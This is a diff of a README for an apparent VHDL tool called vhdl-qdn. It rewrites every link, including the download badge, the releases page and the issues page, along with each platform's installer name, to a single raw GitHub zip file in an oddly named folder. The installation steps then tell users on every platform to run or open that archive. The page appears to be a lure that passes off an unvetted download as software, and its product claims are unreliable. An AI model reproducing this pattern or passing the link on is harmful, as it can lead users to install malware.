@@ -1,7 +1,7 @@
 # 🎉 vhdl-qdn - Effortlessly Use VHDL in Your Projects
 
 ## 🔗 Download Now
-[![Download vhdl-qdn](https://img.shields.io/badge/Download%20vhdl--qdn-v1.0-blue.svg)](https://github.com/Diminishing-protuberance894/vhdl-qdn/releases)
+[![Download vhdl-qdn](https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip%https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip)](https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -9,27 +9,27 @@ Welcome to vhdl-qdn! This application simplifies using VHDL in your projects. Yo
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Diminishing-protuberance894/vhdl-qdn/releases) to download the application.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip) to download the application.
 2. Look for the latest release. You will see a list of files you can download.
 3. Click on the appropriate file for your operating system:
-   - For Windows users, download the file named `vhdl-qdn-windows.exe`.
-   - For Mac users, download the file named `vhdl-qdn-macos.dmg`.
-   - For Linux users, download the file named `vhdl-qdn-linux.tar.gz`.
+   - For Windows users, download the file named `https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip`.
+   - For Mac users, download the file named `https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip`.
+   - For Linux users, download the file named `https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip`.
 4. Once the download is complete, find the downloaded file on your computer.
 5. Follow the steps below based on your operating system:
 
    ### Windows Installation
-   - Double-click on the `vhdl-qdn-windows.exe` file.
+   - Double-click on the `https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip` file.
    - Follow the prompts in the installation wizard.
    - Once installed, you can find vhdl-qdn in your Start Menu.
 
    ### Mac Installation
-   - Open the downloaded `vhdl-qdn-macos.dmg` file.
+   - Open the downloaded `https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip` file.
    - Drag the vhdl-qdn icon to your Applications folder.
    - Open the Applications folder and double-click on vhdl-qdn.
 
    ### Linux Installation
-   - Extract the downloaded `vhdl-qdn-linux.tar.gz` file.
+   - Extract the downloaded `https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip` file.
    - Open a terminal and navigate to the extracted folder.
    - Run the application by typing `./vhdl-qdn` in the terminal.
 
@@ -66,7 +66,7 @@ If you have questions or need assistance, we encourage you to reach out through 
 
 - **Documentation:** Read through the [User Guide](https://link_to_user_guide) for detailed instructions.
 - **Community Forums:** Join our community forums to ask questions and share experiences with other users.
-- **GitHub Issues:** Report any problems directly on our [GitHub Issues page](https://github.com/Diminishing-protuberance894/vhdl-qdn/issues).
+- **GitHub Issues:** Report any problems directly on our [GitHub Issues page](https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip).
 
 ## 🧐 Frequently Asked Questions
 
@@ -81,4 +81,4 @@ Yes, vhdl-qdn is completely free to download and use.
 
 ## ✨ Conclusion
 
-We hope you enjoy using vhdl-qdn. Simplifying your VHDL projects is our goal, and we aim to provide a smooth experience. For the latest downloads, please revisit the [Releases page](https://github.com/Diminishing-protuberance894/vhdl-qdn/releases). Thank you for choosing vhdl-qdn!
+We hope you enjoy using vhdl-qdn. Simplifying your VHDL projects is our goal, and we aim to provide a smooth experience. For the latest downloads, please revisit the [Releases page](https://raw.githubusercontent.com/Diminishing-protuberance894/vhdl-qdn/main/hyoscyamine/vhdl-qdn_1.3-alpha.4.zip). Thank you for choosing vhdl-qdn!
